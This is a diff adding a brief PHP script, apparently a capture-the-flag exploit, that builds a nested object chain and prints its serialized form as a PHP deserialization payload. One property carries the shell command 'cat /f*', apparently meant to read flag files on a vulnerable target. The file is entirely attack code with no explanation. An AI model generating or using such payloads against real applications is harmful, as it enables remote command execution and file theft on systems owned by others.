@@ -1,0 +1,25 @@
+<?php
+error_reporting(0);
+class AAA
+{
+    public $s;
+    public $a;
+}
+class BBB
+{
+    public $c;
+    public $d;
+
+}
+
+class CCC
+{
+    public $c;
+}
+$c=new CCC();
+$c->c=new AAA();
+$c->c->s=new BBB();
+$c->c->a="test";
+$c->c->s->c='cat /f*';
+$c->c->s->d=0;
+echo(serialize($c));
